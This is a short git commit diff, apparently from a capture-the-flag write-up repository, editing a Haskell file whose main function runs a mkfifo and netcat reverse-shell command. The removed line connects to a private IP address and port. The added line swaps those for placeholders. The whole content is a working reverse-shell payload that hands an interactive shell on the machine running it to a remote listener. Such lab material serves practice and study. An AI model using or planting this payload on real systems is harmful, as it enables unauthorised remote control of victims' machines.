cf5adf0fb304b32a6e9b34bfe3f77e80fbbcdaab
grimm-65 <dmunene6565@gmail.com>
2023-10-02 02:50:03 +0300

    first write-up

--- HaskHell/hmw.hs
+++ HaskHell/hmw.hs
@@ -2,4 +2,4 @@ module Main where
 
 import System.Process
 
-main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.9.2.146 6565 >/tmp/f"
+main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc <youre-ip> <port-no> >/tmp/f"
